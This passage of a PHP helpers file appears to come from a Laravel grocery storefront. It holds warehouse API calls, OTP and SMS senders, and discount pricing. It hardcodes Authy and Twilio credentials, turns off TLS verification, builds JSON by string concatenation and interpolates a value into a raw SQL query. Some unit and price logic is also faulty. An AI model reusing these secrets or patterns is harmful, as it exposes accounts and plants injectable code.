        '(GMT-12:00) International Date Line West' => 'Pacific/Kwajalein',
        '(GMT-11:00) Midway Island' => 'Pacific/Midway',
        '(GMT-11:00) Samoa' => 'Pacific/Apia',
        '(GMT-10:00) Hawaii' => 'Pacific/Honolulu',
        '(GMT-09:00) Alaska' => 'America/Anchorage',
        '(GMT-08:00) Pacific Time (US & Canada)' => 'America/Los_Angeles',
        '(GMT-08:00) Tijuana' => 'America/Tijuana',
        '(GMT-07:00) Arizona' => 'America/Phoenix',
        '(GMT-07:00) Mountain Time (US & Canada)' => 'America/Denver',
        '(GMT-07:00) Chihuahua' => 'America/Chihuahua',
        '(GMT-07:00) La Paz' => 'America/Chihuahua',
        '(GMT-07:00) Mazatlan' => 'America/Mazatlan',
        '(GMT-06:00) Central Time (US & Canada)' => 'America/Chicago',
        '(GMT-06:00) Central America' => 'America/Managua',
        '(GMT-06:00) Guadalajara' => 'America/Mexico_City',
        '(GMT-06:00) Mexico City' => 'America/Mexico_City',
        '(GMT-06:00) Monterrey' => 'America/Monterrey',
        '(GMT-06:00) Saskatchewan' => 'America/Regina',
        '(GMT-05:00) Eastern Time (US & Canada)' => 'America/New_York',
        '(GMT-05:00) Indiana (East)' => 'America/Indiana/Indianapolis',
        '(GMT-05:00) Bogota' => 'America/Bogota',
        '(GMT-05:00) Lima' => 'America/Lima',
        '(GMT-05:00) Quito' => 'America/Bogota',
        '(GMT-04:00) Atlantic Time (Canada)' => 'America/Halifax',
        '(GMT-04:00) Caracas' => 'America/Caracas',
        '(GMT-04:00) La Paz' => 'America/La_Paz',
        '(GMT-04:00) Santiago' => 'America/Santiago',
        '(GMT-03:30) Newfoundland' => 'America/St_Johns',
        '(GMT-03:00) Brasilia' => 'America/Sao_Paulo',
        '(GMT-03:00) Buenos Aires' => 'America/Argentina/Buenos_Aires',
        '(GMT-03:00) Georgetown' => 'America/Argentina/Buenos_Aires',
        '(GMT-03:00) Greenland' => 'America/Godthab',
        '(GMT-02:00) Mid-Atlantic' => 'America/Noronha',
        '(GMT-01:00) Azores' => 'Atlantic/Azores',
        '(GMT-01:00) Cape Verde Is.' => 'Atlantic/Cape_Verde',
        '(GMT) Casablanca' => 'Africa/Casablanca',
        '(GMT) Dublin' => 'Europe/London',
        '(GMT) Edinburgh' => 'Europe/London',
        '(GMT) Lisbon' => 'Europe/Lisbon',
        '(GMT) London' => 'Europe/London',
        '(GMT) UTC' => 'UTC',
        '(GMT) Monrovia' => 'Africa/Monrovia',
        '(GMT+01:00) Amsterdam' => 'Europe/Amsterdam',
        '(GMT+01:00) Belgrade' => 'Europe/Belgrade',
        '(GMT+01:00) Berlin' => 'Europe/Berlin',
        '(GMT+01:00) Bern' => 'Europe/Berlin',
        '(GMT+01:00) Bratislava' => 'Europe/Bratislava',
        '(GMT+01:00) Brussels' => 'Europe/Brussels',
        '(GMT+01:00) Budapest' => 'Europe/Budapest',
        '(GMT+01:00) Copenhagen' => 'Europe/Copenhagen',
        '(GMT+01:00) Ljubljana' => 'Europe/Ljubljana',
        '(GMT+01:00) Madrid' => 'Europe/Madrid',
        '(GMT+01:00) Paris' => 'Europe/Paris',
        '(GMT+01:00) Prague' => 'Europe/Prague',
        '(GMT+01:00) Rome' => 'Europe/Rome',
        '(GMT+01:00) Sarajevo' => 'Europe/Sarajevo',
        '(GMT+01:00) Skopje' => 'Europe/Skopje',
        '(GMT+01:00) Stockholm' => 'Europe/Stockholm',
        '(GMT+01:00) Vienna' => 'Europe/Vienna',
        '(GMT+01:00) Warsaw' => 'Europe/Warsaw',
        '(GMT+01:00) West Central Africa' => 'Africa/Lagos',
        '(GMT+01:00) Zagreb' => 'Europe/Zagreb',
        '(GMT+02:00) Athens' => 'Europe/Athens',
        '(GMT+02:00) Bucharest' => 'Europe/Bucharest',
        '(GMT+02:00) Cairo' => 'Africa/Cairo',
        '(GMT+02:00) Harare' => 'Africa/Harare',
        '(GMT+02:00) Helsinki' => 'Europe/Helsinki',
        '(GMT+02:00) Istanbul' => 'Europe/Istanbul',
        '(GMT+02:00) Jerusalem' => 'Asia/Jerusalem',
        '(GMT+02:00) Kyev' => 'Europe/Kiev',
        '(GMT+02:00) Minsk' => 'Europe/Minsk',
        '(GMT+02:00) Pretoria' => 'Africa/Johannesburg',
        '(GMT+02:00) Riga' => 'Europe/Riga',
        '(GMT+02:00) Sofia' => 'Europe/Sofia',
        '(GMT+02:00) Tallinn' => 'Europe/Tallinn',
        '(GMT+02:00) Vilnius' => 'Europe/Vilnius',
        '(GMT+03:00) Baghdad' => 'Asia/Baghdad',
        '(GMT+03:00) Kuwait' => 'Asia/Kuwait',
        '(GMT+03:00) Moscow' => 'Europe/Moscow',
        '(GMT+03:00) Nairobi' => 'Africa/Nairobi',
        '(GMT+03:00) Riyadh' => 'Asia/Riyadh',
        '(GMT+03:00) St. Petersburg' => 'Europe/Moscow',
        '(GMT+03:00) Volgograd' => 'Europe/Volgograd',
        '(GMT+03:30) Tehran' => 'Asia/Tehran',
        '(GMT+04:00) Abu Dhabi' => 'Asia/Muscat',
        '(GMT+04:00) Baku' => 'Asia/Baku',
        '(GMT+04:00) Muscat' => 'Asia/Muscat',
        '(GMT+04:00) Tbilisi' => 'Asia/Tbilisi',
        '(GMT+04:00) Yerevan' => 'Asia/Yerevan',
        '(GMT+04:30) Kabul' => 'Asia/Kabul',
        '(GMT+05:00) Ekaterinburg' => 'Asia/Yekaterinburg',
        '(GMT+05:00) Islamabad' => 'Asia/Karachi',
        '(GMT+05:00) Karachi' => 'Asia/Karachi',
        '(GMT+05:00) Tashkent' => 'Asia/Tashkent',
        '(GMT+05:30) Chennai' => 'Asia/Kolkata',
        '(GMT+05:30) Kolkata' => 'Asia/Kolkata',
        '(GMT+05:30) Mumbai' => 'Asia/Kolkata',
        '(GMT+05:30) New Delhi' => 'Asia/Kolkata',
        '(GMT+05:45) Kathmandu' => 'Asia/Kathmandu',
        '(GMT+06:00) Almaty' => 'Asia/Almaty',
        '(GMT+06:00) Astana' => 'Asia/Dhaka',
        '(GMT+06:00) Dhaka' => 'Asia/Dhaka',
        '(GMT+06:00) Novosibirsk' => 'Asia/Novosibirsk',
        '(GMT+06:00) Sri Jayawardenepura' => 'Asia/Colombo',
        '(GMT+06:30) Rangoon' => 'Asia/Rangoon',
        '(GMT+07:00) Bangkok' => 'Asia/Bangkok',
        '(GMT+07:00) Hanoi' => 'Asia/Bangkok',
        '(GMT+07:00) Jakarta' => 'Asia/Jakarta',
        '(GMT+07:00) Krasnoyarsk' => 'Asia/Krasnoyarsk',
        '(GMT+08:00) Beijing' => 'Asia/Hong_Kong',
        '(GMT+08:00) Chongqing' => 'Asia/Chongqing',
        '(GMT+08:00) Hong Kong' => 'Asia/Hong_Kong',
        '(GMT+08:00) Irkutsk' => 'Asia/Irkutsk',
        '(GMT+08:00) Kuala Lumpur' => 'Asia/Kuala_Lumpur',
        '(GMT+08:00) Perth' => 'Australia/Perth',
        '(GMT+08:00) Singapore' => 'Asia/Singapore',
        '(GMT+08:00) Taipei' => 'Asia/Taipei',
        '(GMT+08:00) Ulaan Bataar' => 'Asia/Irkutsk',
        '(GMT+08:00) Urumqi' => 'Asia/Urumqi',
        '(GMT+09:00) Osaka' => 'Asia/Tokyo',
        '(GMT+09:00) Sapporo' => 'Asia/Tokyo',
        '(GMT+09:00) Seoul' => 'Asia/Seoul',
        '(GMT+09:00) Tokyo' => 'Asia/Tokyo',
        '(GMT+09:00) Yakutsk' => 'Asia/Yakutsk',
        '(GMT+09:30) Adelaide' => 'Australia/Adelaide',
        '(GMT+09:30) Darwin' => 'Australia/Darwin',
        '(GMT+10:00) Brisbane' => 'Australia/Brisbane',
        '(GMT+10:00) Canberra' => 'Australia/Sydney',
        '(GMT+10:00) Guam' => 'Pacific/Guam',
        '(GMT+10:00) Hobart' => 'Australia/Hobart',
        '(GMT+10:00) Melbourne' => 'Australia/Melbourne',
        '(GMT+10:00) Port Moresby' => 'Pacific/Port_Moresby',
        '(GMT+10:00) Sydney' => 'Australia/Sydney',
        '(GMT+10:00) Vladivostok' => 'Asia/Vladivostok',
        '(GMT+11:00) Magadan' => 'Asia/Magadan',
        '(GMT+11:00) New Caledonia' => 'Asia/Magadan',
        '(GMT+11:00) Solomon Is.' => 'Asia/Magadan',
        '(GMT+12:00) Auckland' => 'Pacific/Auckland',
        '(GMT+12:00) Fiji' => 'Pacific/Fiji',
        '(GMT+12:00) Kamchatka' => 'Asia/Kamchatka',
        '(GMT+12:00) Marshall Is.' => 'Pacific/Fiji',
        '(GMT+12:00) Wellington' => 'Pacific/Auckland',
        '(GMT+13:00) Nuku\'alofa' => 'Pacific/Tongatapu'
    );

    return $timezones;
}

if (!function_exists('app_timezone')) {
    function app_timezone()
    {
        return config('app.timezone');
    }
}

if (! function_exists('my_asset')) {
    /**
     * Generate an asset path for the application.
     *
     * @param  string  $path
     * @param  bool|null  $secure
     * @return string
     */
    function my_asset($path, $secure = null)
    {
       
        if(env('FILESYSTEM_DRIVER') == 's3'){
            
            return Storage::disk('s3')->url($path);
        }
        else {
            return app('url')->asset($path, $secure);
        }
    }
}

if (! function_exists('static_asset')) {
    /**
     * Generate an asset path for the application.
     *
     * @param  string  $path
     * @param  bool|null  $secure
     * @return string
     */
    function static_asset($path, $secure = null)
    {
       
        return app('url')->asset($path, $secure);
    }
}

if (! function_exists('isUnique')) {
    /**
     * Generate an asset path for the application.
     *
     * @param  string  $path
     * @param  bool|null  $secure
     * @return string
     */
    function isUnique($email)
    {
        $user = \App\User::where('email', $email)->first();

        if($user == null) {
            return '1'; // $user = null means we did not get any match with the email provided by the user inside the database
        } else {
            return '0';
        }
    }
}


function SplitWord($param){

    $CatCode = $param;
    $subcatName = explode(" ", $CatCode);

      if(count($subcatName) > 0) {
        $subcat = "";
        $i=0;
        foreach($subcatName as $code) {
            $subcat .= substr($code[0], 0,2);
            $i++;
            if($i==2) break;
          }
      }
  return $subcat;
}

if(!function_exists('ECom_Sku_Create')) {
 
    function ECom_Sku_Create($id) {
       
        $productInfo = ProductStock::with('product')->where('product_id', $id)->first(); 
     
        if($productInfo->product->published == '0'){
            $productStatus = 'no';
        }elseif ($productInfo->product->published == '1') {
            $productStatus = 'yes';
        } 
      
        $weight = weightUnit($productInfo->product->unit);
        $productStock = ProductStock::where('product_id', $id)->groupBy('sku')->get();
      
        $response = array();
            foreach ($productStock as $key => $value) {
    
                $sku= $value->sku;
                

                $curl = curl_init();

                curl_setopt_array($curl, array(
                  CURLOPT_URL => "https://ecomexpress.vineretail.com/RestWS/api/eretail/v1/sku/create",
                  CURLOPT_RETURNTRANSFER => true,
                  CURLOPT_ENCODING => "",
                  CURLOPT_MAXREDIRS => 10,
                  CURLOPT_TIMEOUT => 0,
                  CURLOPT_FOLLOWLOCATION => true,
                  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                  CURLOPT_CUSTOMREQUEST => "POST",
                  CURLOPT_POSTFIELDS => http_build_query(array(
                    'ApiOwner' => '',
                    'ApiKey' => '',
                    'RequestBody' => ' {
                  "skuList": [
                   {    
                    "skuCode": "'.$sku.'",
                    "skuName": "'.$productInfo->product->name.'",
                    "classification": "Normal",
                    "detailDesc": "'.$sku.'",
                    "salePrice": "'.$productInfo->product->unit_price.'",
                    "vendorCode": "100011",
                    "baseCost": "'.$productInfo->product->purchase_price.'",   
                    "taxCategory": "'.$productInfo->product->hsn_code.'",
                    "isActive": "'.$productStatus.'",
                    "weight": "'.$weight.'",
                    "serialTrackingRequired": "no",
                    "isSaleable": "yes",                
                    "isBackOrder": "no",
                    "backOrderQty": "1",
                    "isUniqueBarcode": "no",
                    "isStocked": "No",
                    "isPoisnous": "No",
                    "isHazardous": "No",
                    "locations": ["WFC"],
                    "countryOfOrigin": "INDIA"}]
                  }')),
                  CURLOPT_HTTPHEADER => array(
                    "Content-Type: application/x-www-form-urlencoded"
                  ),
                ));

                $response = curl_exec($curl);

                curl_close($curl);
                
            }
            return $response;   

    }
}


function weightUnit($param) {
    $data = explode(' ', $param);
    if(!empty($data) && count($data) > 1){
        $weight = $data[0];
        $unit =   strtolower($data[1]);
        $weightKg = "";

        if($unit == 'gm') {
         return $weightD = $weight/1000;
        }elseif($unit == 'mg'){
          return $weightD = $weight/10000;
        }elseif($unit == 'kg'){
          return $weightD = number_format((float)$weight, 3, '.', '');
        }else{
          return $weightD="";
        }
    }else{
        $weightD = number_format((float)0000, 3, '.', '');
    } 
}

//Ecom Inventoy Cron
function ECom_inventory_Status() {

      $today = \Carbon\Carbon::today()->format('d/m/Y h:i:s');
      $endDate = \Carbon\Carbon::today()->subDays(7)->format('d/m/Y h:i:s');
      $date = \Carbon\Carbon::today()->subDays(7);
      $products = Product::with('stocks')->whereNotNull('ecom_sku_status')->orderBy('id','desc')->get();  
      foreach ($products as $key => $value) {
            foreach ($value['stocks'] as $key => $val) {
                $sku[] = $val->sku;
            }
        }
      $parts = array_chunk($sku, 90);     
      $skuArray = array();
      $resp = array();
      foreach ($parts as $key => $value) {

        $skuArray = implode('","', $value);
        $curl = curl_init();
        curl_setopt_array($curl, array(
        CURLOPT_URL => "https://ecomexpress.vineretail.com/RestWS/api/eretail/v3/sku/inventoryStatus",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_POSTFIELDS => http_build_query(array(
                  'ApiOwner' => '',
                  'ApiKey' => '',

                  'RequestBody' => ' {
                    "skuCodes":["'.$skuArray.'"],
                    "fromDate":"",
                    "toDate":"",
                    "pageNumber":1,
                    "dropShipFlag":"no",
                    "locCode":"WFC"
                }')),
        CURLOPT_HTTPHEADER => array(
          "Content-Type: application/x-www-form-urlencoded"
        ),
      ));
      $response = curl_exec($curl);
      
      curl_close($curl);
       $res = json_decode($response, true);
       
       if($res["responseCode"] == 13){
        \Log::info("success");
        return $res;
        
       }else{
          foreach ($res["response"]["inventoryMap"][0] as $key => $value) {
                $insert = ProductStock::where('sku', $value[0]["skuCode"])->update([
                            'qty' => $value[0]["qty"],
                ]);     
          }
          $resp[] = $response;
       }
        
    }
    // foreach ($products as $key => $value) {
    //     $productStock =  ProductStock::where('product_id', $value->id)->sum('qty');
    //     $product = product::where('id', $value->id)->update('');
    // }
    
   \Log::info('success');
  return $resp;       
}

function EcomPaymentType($type){
    if($type == 'CD'){
      $response = 'COD';
    }else{
     $response = 'Prepaid';
    }
    return $response;
}

//order create api Ecom
function Ecom_order_create($result){ 
$jsonResult = json_decode($result->shipping_address, true);

if(!empty($result->user_id)){
    $userInfo = User::where('id', $result->user_id)->first();
    $customer_code = $userInfo->id;
    $customer_name = $userInfo->name;
}else{
    $customer_code = $result->guest_id;
    $customer_name = $jsonResult["name"];
}
$ship_address1 = $jsonResult["address"];
$ship_city= $jsonResult["city"];
$ship_state= $jsonResult["state"];
$ship_country=  $jsonResult["country"];
$ship_pincode=  $jsonResult["postal_code"];
$ship_phone1=   $jsonResult["phone"];
$ship_email1=  $jsonResult["email"];
$bill_name=  $jsonResult["name"];
$bill_address1=  $jsonResult["address"];
$bill_city=  $jsonResult["city"];
$bill_state=  $jsonResult["state"];
$bill_country=  $jsonResult["country"];
$bill_pincode= $jsonResult["postal_code"];
$bill_phone1=  $jsonResult["phone"];
$bill_email1=  $jsonResult["email"];


  $orderdate = date('d/m/Y h:i:s',strtotime($result->created_at));
  $paymentType = EcomPaymentType($result->payment_type);
  $orderDetails = OrderDetail::where('order_id', $result->id)->get();
  $price = 0;
  if(count($orderDetails) > 0){
    foreach( $orderDetails as $key => $products){
      $price+= $products->price;

      $productStock = ProductStock::with('product')->where('product_id', $products->product_id)->where('variant', $products->variation)->first();
        if($productStock->product->manage_by == 0){
            $orderResponse[] = [
               'lineno' => $productStock->id,
               'sku' => $productStock->sku,
               'order_qty' => $products->quantity,
               'unit_price' => $products->price,
               'vendor' => "",
               "tax_inclusive" => "YES",
               "tax_percentage" =>  "0",
               "shipping_charges" => $products->shipping_cost,
               "transporter" => "1001"
            ]; 
        }        
    }
  }
 
  if(!empty($orderResponse)){
    $orderitems = json_encode($orderResponse);
   
     $curl = curl_init();
    curl_setopt_array($curl, array(
    CURLOPT_URL => "https://ecomexpress.vineretail.com/RestWS/api/eretail/v1/order/create",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_ENCODING => "",
    CURLOPT_MAXREDIRS => 10,
    CURLOPT_TIMEOUT => 0,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => "POST",
    CURLOPT_POSTFIELDS => http_build_query(array(
        'ApiOwner' => '',
        'ApiKey' => '',
        'RequestBody' => '{
          "order": {
            "order_location": "WFC",
            "order_no": "'.$result->code.'",
            "uniqueKey": "",
            "order_type": "'.$paymentType.'",
            "payment_type": "'.$result->payment_type.'",
            "status": "Confirmed",
            "order_date": "'.$orderdate.'",
            "order_amount": "'.$result->grand_total.'",
            "order_currency": "INR",
            "customer_code": "'.$customer_code.'",
            "customer_name": "'.$customer_name.'",
            "ship_address1": "'.$ship_address1.'",
            "ship_address2": " ",
            "ship_city": "'.$ship_city.'",
            "ship_state": "'.$ship_state.'",
            "ship_country": "'.$ship_country.'",
            "ship_pincode": "'.$ship_pincode.'",
            "ship_phone1": "'.$ship_phone1.'",
            "ship_email1": "'.$ship_email1.'",
            "bill_name": "'.$bill_name.'",
            "bill_address1": "'.$bill_address1.'",
            "bill_address2": " ",
            "bill_city": "'.$bill_city.'",
            "bill_state": "'.$bill_state.'",
            "bill_country": "'.$bill_country.'",
            "bill_pincode":"'.$bill_pincode.'",
            "bill_phone1": "'.$bill_phone1.'",
            "bill_email1": "'.$bill_email1.'",
            "order_remarks": "",
            "other_charge1": " ",
            "discount_code": "",
            "store_credit": "0.00",
            "items": '.$orderitems.'
          }
          }')),
        CURLOPT_HTTPHEADER => array(
          "Content-Type: application/x-www-form-urlencoded"
        ),
      ));
    $response = curl_exec($curl);
    curl_close($curl);         
    return $response;
  }
   
} 

//order Cancel
function Ecom_order_cancel($id){

    $order =Order::where('id', $id)->whereNotNull('ecom_response_order_id')->first();
    if(!empty($order)){
        $ecomJson = json_decode($order->ecom_response, true);
        $curl = curl_init();

          curl_setopt_array($curl, array(
          CURLOPT_URL => "https://ecomexpress.vineretail.com/RestWS/api/eretail/v1/order/cancel",
          CURLOPT_RETURNTRANSFER => true,
          CURLOPT_ENCODING => "",
          CURLOPT_MAXREDIRS => 10,
          CURLOPT_TIMEOUT => 0,
          CURLOPT_FOLLOWLOCATION => true,
          CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
          CURLOPT_CUSTOMREQUEST => "POST",
          CURLOPT_POSTFIELDS =>http_build_query(array(
              'ApiOwner' => '',
              'ApiKey' => '',
              'RequestBody' => '{
               "order":{
               "order_location":"",
               "uniqueKey":"'.$ecomJson["uniqueKey"].'",
               "order_no":"'.$ecomJson["requestKey"].'",
               "cancelation_reason":"Others",
               "cancelation_remarks":"Cancel this order"
               }
            }')),
          CURLOPT_HTTPHEADER => array(
          "Content-Type: application/x-www-form-urlencoded"
          ),
          ));

          $response = curl_exec($curl);

          curl_close($curl);

               
      return $response;
    }

    }


   function productManageBy($id){
    if($id == 1){
       $response = 'Ekhadi'; 
    }elseif($id == 0){
        $response = 'Ecom';
    }
    return $response;
   }

   function str_limit2($title,$limit){
        return $title;
   }

    function get_mapped_pins(){

        $sorting_hub = \App\ShortingHub::select('area_pincodes')->get()->toArray();
        $mapped_pin_code = array();

        if(count($sorting_hub) > 0){
            foreach ($sorting_hub as $key => $pin_codes) {
                foreach ($pin_codes as $key => $pins) {
                    foreach (json_decode($pins) as $key => $pin) {
                        $mapped_pin_code[] = $pin;
                    }
                }
            }
        }
        return $mapped_pin_code;
    }

    function get_unique_pins($array1, $array2){
        return array_diff($array1, $array2);
    }


    function OTPverifyTwillio($otp, $mobileNo, $countryCode){

        // $user_id= $this->input->post('user_id');
        
                $mobile = $mobileNo;
        
                $country_code = $countryCode;
        
                $otp = $otp;
        
                // $user_type = $this->input->post('user_type');
        
                $HeaderValue = array(
        
                "X-Authy-API-Key: " . 'rzdRE0WzqJdaZ1is3KK8FJn8Kcc7RHuV',
        
                );
        
        
        
                $pd = curl_init();
        
                curl_setopt($pd, CURLOPT_URL, 'https://api.authy.com/protected/json/phones/verification/check?phone_number=' . $mobile . '&country_code=' . $country_code . '&verification_code=' . $otp);
        
                curl_setopt($pd, CURLOPT_HTTPHEADER, $HeaderValue);
        
                curl_setopt($pd, CURLOPT_HEADER, 0);
        
                curl_setopt($pd, CURLOPT_POST, 0);
        
                curl_setopt($pd, CURLOPT_RETURNTRANSFER, true);
        
                curl_setopt($pd, CURLOPT_FRESH_CONNECT, true);
        
                curl_setopt($pd, CURLOPT_SSL_VERIFYPEER, false);
        
                $otpResponse = curl_exec($pd);
        
                $otpDecode = json_decode($otpResponse);
        
        
                return $otpDecode;
        
        
        
        }



        function sendSMS_new($phone,$message,$locale=""){

            $smsDataValue = array(
    
            'api_key' => 'rzdRE0WzqJdaZ1is3KK8FJn8Kcc7RHuV',
    
            'via' => 'sms',
    
            'phone_number' => $phone,
    
            'country_code' => '+91',
    
            'locale' => $locale,
    
            'message' => $message,
    
            );
    
    
    
            $pd = curl_init();
    
            curl_setopt($pd, CURLOPT_URL, 'https://api.authy.com/protected/json/phones/verification/start');
    
            curl_setopt($pd, CURLOPT_HEADER, 0);
    
            curl_setopt($pd, CURLOPT_POST, 1);
    
            curl_setopt($pd, CURLOPT_RETURNTRANSFER, true);
    
            curl_setopt($pd, CURLOPT_FRESH_CONNECT, true);
    
            curl_setopt($pd, CURLOPT_SSL_VERIFYPEER, false);
    
            curl_setopt($pd, CURLOPT_POSTFIELDS, $smsDataValue);
    
            $otpResponse = curl_exec($pd);
    
            $otpDecode = json_decode($otpResponse);
            return $otpDecode;
    
            }

    //Shows Base Price with discount
if (! function_exists('peer_discounted_base_price')) {
    function peer_discounted_base_price($id,$shortId="")
    {
        // DB::enableQueryLog();
        if(!empty($shortId)){
            $peer_discount_check = PeerSetting::where('product_id', '"'.$id.'"')->whereRaw('json_contains(sorting_hub_id, \'["' . $shortId['sorting_hub_id']. '"]\')')->latest('id')->first();
           
        }else{
            $peer_discount_check = PeerSetting::where('product_id', '"'.$id.'"')->latest('id')->first();
        }    
        // dd(DB::getQueryLog()); 
        // echo '<pre>';
        // print_r($peer_discount_check);
      // echo $peer_discount_check->peer_discount;exit;
        // die;

        //$check_count = count($peer_discount_check);

        if(!empty($shortId)){
            $product = MappingProduct::where(['sorting_hub_id'=>$shortId['sorting_hub_id'],'product_id'=>$id])->first();
            $price = $product['purchased_price'];
            $stock_price = $product['selling_price'];
            if($price == 0 || $stock_price == 0){
                $product = Product::findOrFail($id);
                $price = $product->unit_price;
                $productstock = ProductStock::where('product_id', $id)->select('price')->first();
                $stock_price = $productstock->price;

            }  

        }else{
            $product = Product::findOrFail($id);
            $price = $product->unit_price;
            $productstock = ProductStock::where('product_id', $id)->select('price')->first();
            if(!is_null($productstock)){
                $stock_price = $productstock->price;  
            }
            

        }
            if(!empty($peer_discount_check)){      
                
                $main_discount = $stock_price - $price;

                if(Session::has('referal_discount')){
                     // $discount_percent = Session::get('referal_discount');
                     $discount_percent = substr($peer_discount_check->customer_discount, 1, -1);
                     $last_price = ($main_discount * $discount_percent)/100; 
                    }

                $price = $stock_price - $last_price;
                //echo convert_price($price);exit;
                return $price;
            }else{
               
                 $price = $stock_price;
                 return $price;
            }    

           $price = $stock_price;
            return $price;
    }
}

if (! function_exists('peer_discounted_newbase_price')) {
    function peer_discounted_newbase_price($id,$shortId="")
{
    $self = 0;
    if(Auth::check()){
        if(Auth::user()->user_type=="partner" && Auth::user()->peer_partner==1){
            $self = 1;
        }
    }
    // DB::enableQueryLog();
    if(!empty($shortId)){
        $peer_discount_check = PeerSetting::where('product_id', '"'.$id.'"')->whereRaw('json_contains(sorting_hub_id, \'["' . $shortId['sorting_hub_id']. '"]\')')->latest('id')->first();           
    }else{
        $peer_discount_check = PeerSetting::where('product_id', '"'.$id.'"')->latest('id')->first();
    }    
    // dd(DB::getQueryLog());
    $product = Product::findOrFail($id);
    $productstock = ProductStock::where('product_id', $id)->select('price')->first(); 

    if(!empty($shortId)){
        $product = MappingProduct::where(['sorting_hub_id'=>$shortId['sorting_hub_id'],'product_id'=>$id])->first();
        $price = $product['purchased_price'];
        $stock_price = $product['selling_price'];
        if($price == 0 || $stock_price == 0){
            $product = Product::findOrFail($id);
            $price = $product->unit_price;
            $productstock = ProductStock::where('product_id', $id)->select('price')->first();
            $stock_price = $product->unit_price;
            if(!is_null($productstock)){
                $stock_price = $productstock->price; 
            }  

        }  

    }else{
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        $productstock = ProductStock::where('product_id', $id)->select('price')->first();
        $stock_price = $product->unit_price;
        if(!is_null($productstock)){
            $stock_price = $productstock->price; 
        }  

    }  
    

    if(!empty($peer_discount_check)){
        $customer_off =  $peer_discount_check->customer_off;
        $customer_discount = $peer_discount_check->customer_discount;
        $discount_type = $peer_discount_check->discount; 
        $peer_commission = $peer_discount_check->peer_commission;
        $master_commission = $peer_discount_check->master_commission;

        if(!empty($peer_discount_check->customer_off)){
            // $price = $productstock->price - $peer_discount_check->customer_off;
            //$price = $stock_price - $peer_discount_check->customer_off;
            if($self=="1" || $self==1){
                $price = $stock_price-($peer_commission+$master_commission+$peer_discount_check->customer_off);
            }else{
                $price = $stock_price - $peer_discount_check->customer_off;
            }
            
            return $price;
        }else{
            // $stock_price = $productstock->price;  
            $discount_percent = substr($peer_discount_check->customer_discount, 1, -1);
            // $price = ($stock_price * $discount_percent)/100;
            $price = ($stock_price * $discount_percent)/100;
            return $price;
        }

    }else{
        // $price = $productstock->price;
        $price = $stock_price;
        return $price;
    }
    
       // $price = $productstock->price;
       $price = $stock_price;
       return $price;
}
} 



if (! function_exists('peer_discounted_percentage')) {
    function peer_discounted_percentage($id,$shortId="")
    {

        if(!empty($shortId)){
            $peer_discount_check = PeerSetting::where('product_id', '"'.$id.'"')->whereRaw('json_contains(sorting_hub_id, \'["' . $shortId['sorting_hub_id']. '"]\')')->latest('id')->first();
        }else{
            $peer_discount_check = PeerSetting::where('product_id', '"'.$id.'"')->latest('id')->first();
        }   
        

            if(!empty($peer_discount_check)){      
                $discount_percent = substr($peer_discount_check['customer_discount'], 1, -1); 
                if(Session::has('referal_discount')){
                    $discount_percent = substr($peer_discount_check['customer_discount'], 1, -1);     
                    return $discount_percent;               
                }
            }else{
                $discount_percent = 0;
                 return $discount_percent;
            }    
            return $discount_percent;
    }
}     

function return_send_SMS($to, $text){
    $sid = "AC7c95b58e60907ea7dd55651631ed64e1"; // Your Account SID from www.twilio.com/console
    $token = "f1cd9b9c70e5f7d5ff36fe177092a3bf"; // Your Auth Token from www.twilio.com/console
    $validTwillioNumber = "+19286158275";

    $client = new Client($sid, $token);
    
    try {
        $message = $client->messages->create(
          $to, // Text this number
          array(
            'from' => $validTwillioNumber, // From a valid Twilio number
            'body' => $text
          )
        );
       return $message; 
    } catch (\Exception $e) {

    }

}


function mobilnxtSendSMS($to="",$from="",$msg="",$tid=""){
    $access_key = env("ACCESS_KEY");
    $tid_number = $tid;
    $sendTo = $to;
    $sendFrom = $from;
    $msgContent = $msg;
    $post = [
            'accesskey'=> $access_key,
            'tid'=> $tid_number,
            'to'=> $sendTo,
            'text'=> $msgContent,
            'from'=> $sendFrom,
            'tid'=> $tid_number
            ];
    $url = "https://api.mobilnxt.in/api/push";
    try{
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($curl,CURLOPT_URL,$url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));
        $response = curl_exec($curl);
        $result = json_decode($response);
        curl_close($curl);
        return  $result;

    } catch(\Exception $e){
        dd($e);
    }
    
}

if(!function_exists('get_product_cart_qty')){

    function get_product_cart_qty($product_id){

        $cartQty=0;
        if(Session::has('cart'))
        {
		$cart = Session::get('cart')->where('id',$product_id)->first();
        
		if(!is_null($cart)){
           
			$cartQty = $cart['quantity'];
		}
        }
        
        return $cartQty;
    }

}

if(!function_exists('mapped_product_stock'))
{
    function mapped_product_stock($sortId,$productId){
        $quantity = 0;
        $qty = MappingProduct::where(['sorting_hub_id'=>$sortId,'product_id'=>$productId,'published'=>1])->first();
        if(!is_null($qty)){
            $quantity= $qty->qty;
        }
        //info($quantity);
        return $quantity;
        
        
    }
}


if(!function_exists('getShortId')){
    function getShortId($sid,$product_id){
        $mappedProductPrice = \App\MappingProduct::where(['sorting_hub_id'=>$sid['sorting_hub_id'],'product_id'=>$product_id])->first();
        return $mappedProductPrice;
        
        // echo $sid;die;
    }
}

if(!function_exists('SMSonOrderPlaced')){
function SMSonOrderPlaced($order_id){
    $order = Order::findOrFail($order_id);
    $currentTime = Carbon::now();
    if(strtotime(date('H:i:s'))>=strtotime('18:00:00')){
        
        $addDate = Carbon::now()->addDay(1);
        $date = $addDate->toDateString();
    }else{
        
        $date = $currentTime->toDateString();
    }
    
    $to = json_decode($order->shipping_address,true)['phone'];
    $user_phone = "";
    if(!empty($order->user_id))
    {
        $user_phone = User::where('id',$order->user_id)->first()->phone;
    }
    
    $grand_total = $order->grand_total;
